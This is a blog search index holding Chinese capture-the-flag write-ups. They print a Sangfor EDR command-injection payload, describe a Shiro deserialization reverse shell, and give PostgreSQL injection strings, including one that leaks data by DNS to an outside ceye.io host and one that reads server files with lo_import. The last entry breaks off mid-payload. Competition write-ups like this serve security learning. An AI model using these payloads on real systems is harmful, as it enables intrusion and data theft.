<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HGAME2021-week1</title>
      <link href="article/hgame2021week1/"/>
      <url>article/hgame2021week1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码不太对，别想骗窝." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2645354fc567b772b3ee29a0ef568202e8d4d689c82333f08563c4d21ed78906"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码查看哦.">这里需要密码查看哦.</span>      </label>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CnHongKe2021公测赛</title>
      <link href="article/2021gongcesai/"/>
      <url>article/2021gongcesai/</url>
      
        <content type="html"><![CDATA[<p>2月5日</p><p>比赛情况：</p><img src="/article/2021gongcesai/image-20210205133228513.png" class="" title="rank"><p>感谢大师傅们手下留情</p><a id="more"></a><img src="/article/2021gongcesai/image-20210205133840182.png" class="" title="rank"><p>主办方平台关太快了2333，睡了一觉起来连平台都没了</p><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>PHP CGI解析漏洞出现的原因是（ ）</p><ul><li><p>A.cgi.fix_pathi配置错误</p></li><li><p>B.cgi.fix_pathinfo配置错误</p></li><li><p>C.phpinfo配置错误</p></li><li><p>D.cgi.fix__status_en配置错误</p></li></ul><p>很显然是<code>cgi.fix_pathinfo</code>配置错误，当设置了cgi.fix_pathinfo = 1时，PHP就会以’/‘为分割符从最后一个文件开始向前找存在的文件去执行，例如<code>/upload/a.jpg/b.php</code>.</p><hr><h3 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h3><p>扫码得flag</p><img src="/article/2021gongcesai/image-20210205172001695.png" class="" title="image-20210205172001695"><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>深信服载入史册</p><p>直接payload打</p><img src="/article/2021gongcesai/image-20210205134031474.png" class="" title="image-20210205134031474"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;?strip_slashes&#x3D;system&amp;host&#x3D;cat &#x2F;flag</code></pre><p>这题去年有过，是作为线下赛的题目，当时没外网，只能硬审，或者…<del>记得payload</del>，毕竟太有名了…</p><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Shiro remeberMe反序列化漏洞（Shiro-550）</p><p>用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞</p><img src="/article/2021gongcesai/image-20210205135031033.png" class="" title="image-20210205135031033"><p>可以如 <a href="https://www.cnblogs.com/sup3rman/archive/2020/07/16/13322898.html">参考文章</a> 所示，利用<code>shiro.py</code>生成payload</p><img src="/article/2021gongcesai/image-20210205135241419.png" class="" title="image-20210205135241419"><p>当然后来才发现更简单的，直接用 <code>ShiroScan</code> 工具，可以用DNSlog的方式，也可以反弹shell，这里直接反弹shell</p><img src="/article/2021gongcesai/image-20210205135442119.png" class="" title="image-20210205135442119"><p>成功弹到shell</p><img src="/article/2021gongcesai/image-20210205135511988.png" class="" title="image-20210205135511988"><hr><h3 id="fast-x-3"><a href="#fast-x-3" class="headerlink" title="fast x 3"></a>fast x 3</h3><p>老脚本大师了</p><img src="/article/2021gongcesai/image-20210205135615967.png" class="" title="image-20210205135615967"><p>写个py脚本即可，直接上payload，蹩脚编程，师傅们见谅…</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/5 9:22@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> collectionsurl <span class="token operator">=</span> <span class="token string">"http://180.109.90.207:23891/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>responses <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>responses<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"1--------------------------------取字符串"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> responses<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;divid=\"math\">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"2--------------------------------计数"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span>cal<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"3--------------------------------排序"</span><span class="token punctuation">)</span><span class="token keyword">from</span> collections <span class="token keyword">import</span> OrderedDictstr2 <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"4--------------------------------取key"</span><span class="token punctuation">)</span>val <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    val <span class="token operator">+=</span> ival <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"5--------------------------------赋data"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"6--------------------------------提交"</span><span class="token punctuation">)</span>post_responses <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_responses<span class="token punctuation">)</span></code></pre><p>编编改改凑合用</p><img src="/article/2021gongcesai/image-20210205140020576.png" class="" title="image-20210205140020576"><hr><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><h3 id="Des"><a href="#Des" class="headerlink" title="Des"></a>Des</h3><p>2015ISCC的题目改题<code>没有题目的题目</code></p><p>主要代码</p><pre class="language-none"><code class="language-none">public boolean check() &#123;     byte[] b2 &#x3D; &#123;103, 112, 111, 49, 61, 113, 117, 109, 76, 108, 77, 57, 59, 90, 64, 105, 33, 89, 74, 113, 92, 84, 87, 113, 105, 65, 35, 74, 93, 73, 43, 120&#125;;     byte[] b3 &#x3D; this.result1.getBytes();     for (int j &#x3D; 0; j &lt; b3.length; j++) &#123;         Log.d(&quot;test&quot;, ((byte) (b3[j] ^ j)));     &#125;     if (b3.length !&#x3D; b2.length) &#123;         return false;     &#125;     for (int j2 &#x3D; 0; j2 &lt; b2.length; j2++) &#123;         if ((b3[j2] ^ b2[j2]) !&#x3D; j2) &#123;             return false;         &#125;     &#125;     return true; &#125;</code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64V0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">DeCheck</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    xx <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>v1<span class="token punctuation">)</span>    <span class="token comment">##print xx</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'ilovedes'</span>    iv <span class="token operator">=</span> <span class="token string">'\x01\x02\x03\x04\x05\x06\x07\x08'</span>    k <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    flag <span class="token operator">=</span> k<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>DeCheck<span class="token punctuation">(</span>V0<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Your flag is: "</span> <span class="token operator">+</span> flag</code></pre><img src="/article/2021gongcesai/image-20210205140432528.png" class="" title="image-20210205140432528"><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205171005.jpg" class="" title="QQ图片20210205171005"><p>参考链接：<a href="http://bobao.360.cn/ctf/learning/136.html">http://bobao.360.cn/ctf/learning/136.html</a></p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DTMF"><a href="#DTMF" class="headerlink" title="DTMF"></a>DTMF</h3><p>电话音，网上有在线识别网站</p><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p>格式要求<code>.wav</code>，先用ffmpeg转格式</p><img src="/article/2021gongcesai/image-20210205140704301.png" class="" title="image-20210205140704301"><p>再放上去识别</p><img src="/article/2021gongcesai/image-20210205140736060.png" class="" title="image-20210205140736060"><pre class="language-none"><code class="language-none">CnHongKe&#123;A18D3B18C*231#&#125;</code></pre><hr><h3 id="HalfQR"><a href="#HalfQR" class="headerlink" title="HalfQR"></a>HalfQR</h3><p>二维码修复网站 <a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><img src="/article/2021gongcesai/qr1.jpg" class="" title="QR"><p>手 撸</p><img src="/article/2021gongcesai/image-20210205165950957.png" class="" title="image-20210205165950957"><img src="/article/2021gongcesai/image-20210205170018477.png" class="" title="image-20210205170018477"><p>然后</p><img src="/article/2021gongcesai/image-20210205165843064.png" class="" title="image-20210205165843064"><p>最后</p><pre class="language-none"><code class="language-none">CnHongKe&#123;f88ae38f450e76d3c92410e3650df67&#125;</code></pre><p>也可以手算…毕竟数据域的半边东西给了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题目作为线下赛题目是难了，毕竟去年有过一次线下，线上赛就不说了，神仙乱斗2333，还不用交WP，希望主办方能完善赛制，首先赛后都不用交WP是挺离谱的，其次题目的质量…其实还行，但作为线上还是简单了。</p><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205185049.jpg" class="" width="233"><p>懂的都懂2333</p><p>还是有些收获的，提前祝大家新年快乐！</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</title>
      <link href="article/cqb2021/"/>
      <url>article/cqb2021/</url>
      
        <content type="html"><![CDATA[<p>只做了一道题，按F注入，研究了pgsql，算个小笔记，不能算研究性文章</p><a id="more"></a><h2 id="按F注入"><a href="#按F注入" class="headerlink" title="按F注入"></a>按F注入</h2><p>打开题目看到只能手机访问，看到了源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>body<span class="token operator">></span>只有手机才能访问<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">function</span> <span class="token function">is_mobile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$clientkeywords</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token single-quoted-string string">'nokia'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sony'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ericsson'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mot'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'samsung'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'htc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sgh'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sharp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sie-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'philips'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'panasonic'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'alcatel'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lenovo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'iphone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ipod'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'blackberry'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'meizu'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'android'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'netfront'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'symbian'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ucweb'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'windowsce'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'palm'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamini'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamobi'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'openwave'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'nexusone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cldc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'midp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'wap'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mobile'</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">//从HTTP_USER_AGENT中查找手机浏览器的关键字--></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/("</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$clientkeywords</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre><p>于是在HEADER里添加<code>User-Agent: mobile</code>即可</p><img src="/article/cqb2021/image-20210201185004667.png" class="" title="UA"><p>点击任何都是JavaScript脚本<code>javascript:alert(&#39;投票成功,恭喜您获得奶奶一个&#39;)</code>，底部发现了提示</p><p><code>&lt;!--&lt;a href=&quot;?f=1&quot;&gt;我选择按下F进入TK&lt;/a&gt;--&gt;</code></p><p>于是访问<code>./?f=1</code>没有变化，猜测SSRF或SQL注入，但是没有其他提示。</p><p>访问<code>./?f=1&#39;</code>发现有弹窗</p><img src="/article/cqb2021/image-20210201185510275.png" class="" title="小哥哥"><p>fuzz一波，发现<code>#</code>和<code>%23</code>都会一直弹窗，而使用<code>--</code>注释即<code>?f=1&#39; --</code>却不会弹窗，搜索一波发现是 PostgreSQL ，猜测<strong>语法错误</strong>或者<strong>报错</strong>会有弹窗</p><p>甚至搜到了原题，赛后向 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬请教得知，当时比赛的WP是有错误的，后续会道来。</p><p>测试一下发现<code>./?f=</code></p><blockquote><ul><li><code>gyy</code>，没有警告</li><li><code>gyy&#39;</code>，警告</li><li><code>gyy&#39; and 1=0 --</code>，没有警告</li><li><code>gyy&#39; and 1=1 --</code>，没有警告</li><li><code>gyy&#39; order by 1 --</code>，没有警告</li><li><code>gyy&#39; order by 2 --</code>，没有警告</li><li><code>gyy&#39; order by 3 --</code>， 警告</li><li><code>gyy&#39; union select 1,2 --</code>， 警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; --</code>，没有警告</li><li><code>gyy&#39; union select 1,pg_sleep(10) --</code>， 警告</li><li><code>gyy&#39; union select 1,cast(pg_sleep(10) as text) --</code>，没有警告（有延迟！）</li><li><code>gyy&#39; union select 1,&#39;2&#39; from pg_database --</code>，没有警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; from gyy --</code>， 警告</li><li><code>gyy&#39; union select 1,chr(65) --</code>，没有警告</li><li><code>gyy&#39; union select 1,chr(-65) --</code>，没有警告</li></ul></blockquote><p>由order by可以判断此处列数为2，由union select可以判断1处对应列为数值类型，2处对应非数值类型</p><h3 id="方法一：延时注入"><a href="#方法一：延时注入" class="headerlink" title="方法一：延时注入"></a>方法一：延时注入</h3><p> postgrest数据库中的延时函数有<code>pg_sleep()</code>/<code>pg_sleep_for()</code>/<code>pg_sleep_until()</code></p><p>查阅资料得知：</p><blockquote><p>pg_sleep(seconds)<br>pg_sleep_for(interval)<br>pg_sleep_until(timestamp with time zone)</p><p>pg_sleep让当前的会话进程休眠seconds 秒以后再执行。seconds是一个double precision 类型的值，所以可以指定带小数的秒数。<br>pg_sleep_for 对于指定为interval的较长睡眠时间是一个便利函数。<br>pg_sleep_until在需要特定唤醒时间时比较便利。</p><p>SELECT pg_sleep(1.5);<br>SELECT pg_sleep_for(‘5 minutes’);<br>SELECT pg_sleep_until(‘tomorrow 03:00’);</p></blockquote><p>当时比赛脚本参考 <a href="https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py">balsn</a></p><p>这里不做阐述，因为最终得出结果</p><pre class="language-none"><code class="language-none">version: (Debian 11.2-1.pgdg90+1)current_db: docker_dbcurrent_schema: publictable of public: searchescolumns of searches: id,searchcounts of searches:0</code></pre><p><code>searches</code>表为空，所以本题应读取文件</p><h3 id="方式二：信息带外"><a href="#方式二：信息带外" class="headerlink" title="方式二：信息带外"></a>方式二：信息带外</h3><p>利用DNSlog方式</p><p>在PostgreSQL中，存在dblink模块，可以外联数据库或者当前数据库，dblink_connect同时会对host进行DNS查询，利用查询给定DNS的子域名，再查DNS解析记录即可获取传递的信息，这里用<a href="http://ceye.io/">ceye</a>来记录</p><p>首先看看dblink模块有没有开启</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;&#39;)) --</code></pre><p>没有报错，说明可以操作继续尝试</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;host&#x3D;&#39; || (SELECT current_database()) || &#39;.xxxx.ceye.io user&#x3D;a password&#x3D;a dbname&#x3D;a&#39;)) --</code></pre><p>xxxx是ceye个人的 Identifier ，可见成功返回了当前数据库名</p><img src="/article/cqb2021/image-20210201195343606.png" class="" title="ceye"><p>原理是通过<code>.</code>连接，让pgsql去解析host即给定DNS的子域名，从而带出信息。顺着这个方法可以带出来部分信息</p><p>接着就要考虑如何文件包含了，在这里原WP写的很清楚</p><blockquote><p>我们可能确实需要从中窃取数据<code>/var/lib/postgresql/data/secret</code>。不幸的是，如果我们尝试使用<code>pg_read_file</code>或<code>pg_read_binary_file</code>读取文件，则不会获得传入连接，因此当前用户可能无权使用这些功能。</p><p>读取文件的替代方法是使用<a href="https://www.postgresql.org/docs/11/lo-funcs.html">大对象</a>。我们可以用来<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。</p></blockquote><p> 当前用户为docker，不够权限执行系统管理员才能执行的函数<code>pg_read_file()</code>, <code>pg_ls_dir()</code> or <code>pg_stat_file()</code> ，也不方便写udf，没有写权限。</p><p>下面截取原WP的部分内容：</p><blockquote><p>碰到这种情况也就是需要绕过的时候的做法，一般都是谷歌百度，然后阅读文档，另外可以自己起一个环境去搜索相关的函数。例如在这里，balsn的做法是另外起一个环境：</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%file%&#39;;   查询所有带有file的函数pg_stat_get_db_temp_files pg_walfile_name_offset pg_walfile_name pg_rotate_logfile_old pg_read_file_old pg_read_file pg_read_file pg_read_file pg_read_binary_file pg_read_binary_file pg_read_binary_file pg_stat_file pg_stat_file pg_relation_filenode pg_filenode_relation pg_relation_filepath pg_show_all_file_settings pg_hba_file_rules pg_rotate_logfile pg_current_logfile pg_current_logfile</code></pre><p>但是这些函数都似乎没起作用</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%read%&#39;;   查阅带有read的函数loread pg_stat_get_db_blk_read_time pg_read_file_old pg_read_file pg_read_binary_file</code></pre><p>可以看到第一个方法，通过查阅文档（学会阅读文档很重要！）</p><p>loread是面向SQL的大对象函数，比如<code>lo_from_bytea</code>，<code>lo_put</code>，<code>lo_get</code>，<code>lo_creat</code>, <code>lo_create</code>,</p><pre class="language-none"><code class="language-none">lo_unlink&#96;， &#96;lo_import&#96;和 &#96;lo_export</code></pre><p> 服务器端的<code>lo_import</code>和 <code>lo_export</code>函数和客户端的那几个有着显著的不同。 这两个函数在服务器的文件系统里读写文件， 使用数据库所有者的权限进行。 因此，只有超级用户才能使用他们。相比之下，客户端的输入和输出函数在客户端的文件系统里读写文件， 使用客户端程序的权限。客户端函数不需要超级用户权限。<br><code>lo_read</code>和<code>lo_write</code>的功能通过服务器端调用可用， 但是服务器端函数名不同于客户端接口，因为他们不包含下划线。你必须作为<code>loread</code>和<code>lowrite</code> 调用这些函数。 </p><p>在将服务器端lo_import和lo_export函数授权给非超级用户时需要仔细考虑安全隐患。 具有此类权限的恶意用户可以轻松地将其变为超级用户（例如，通过重写服务器配置文件），或者可以攻击服务器的其余文件系统，而无需获取数据库超级用户权限。 因此，对这两个函数的权限授予必须谨慎。</p></blockquote><p>回到题目中来，lo_import方法可以读取文件为postgres对象，原准备利用lo_export写文件，可是应该是没有权限</p><p>我们先包含<code>index.php</code>看看源码</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p><strong>请注意！请注意！请注意！</strong>错误写法：</p><p><code>./?f=gyy&#39; union select 1,(select dblink_connect(&#39;host=&#39; || (select 